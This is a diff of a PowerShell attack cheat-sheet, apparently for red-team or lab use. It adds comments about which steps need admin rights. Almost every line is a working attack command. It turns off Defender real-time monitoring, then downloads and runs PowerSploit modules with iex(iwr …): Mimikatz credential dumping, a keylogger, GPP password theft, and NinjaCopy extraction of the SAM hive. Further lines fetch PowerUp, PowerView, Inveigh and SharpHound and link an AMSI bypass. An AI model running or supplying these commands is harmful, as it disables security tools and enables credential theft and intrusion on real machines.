@@ -1,8 +1,10 @@
 Set-MPPreference -DisableRealtimeMonitoring $true
 
+# admin privs required
 iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1 -usebasicparsing)
 Invoke-Mimikatz
 
+# user context ok
 iex (iwr https://raw.githubusercontent.com/clr2of8/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1)
 Get-Keystrokes
 cat $env:temp\key.log
@@ -14,12 +16,22 @@ $PEBytes = Get-Content C:\Windows\System32\notepad.exe -Encoding Byte -Raw
 Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString
 
 iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1 -usebasicparsing)
-iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1 -usebasicparsing)
 
-iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1 -usebasicparsing)
+# admin privs required
+iex( iwr https://raw.githubusercontent.com/clr2of8/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1 -usebasicparsing)
 Invoke-NinjaCopy -path C:\Windows\System32\config\SAM -LocalDestination $env:Temp\sam
+
+# user context ok
 iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 -usebasicparsing)
+
+# user context ok
 iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -usebasicparsing)
+
+# user context ok
 https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
+
+# admin privs required
 iex( iwr https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1 -usebasicparsing)
+
+# user context ok
 iex( iwr https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1 -usebasicparsing)
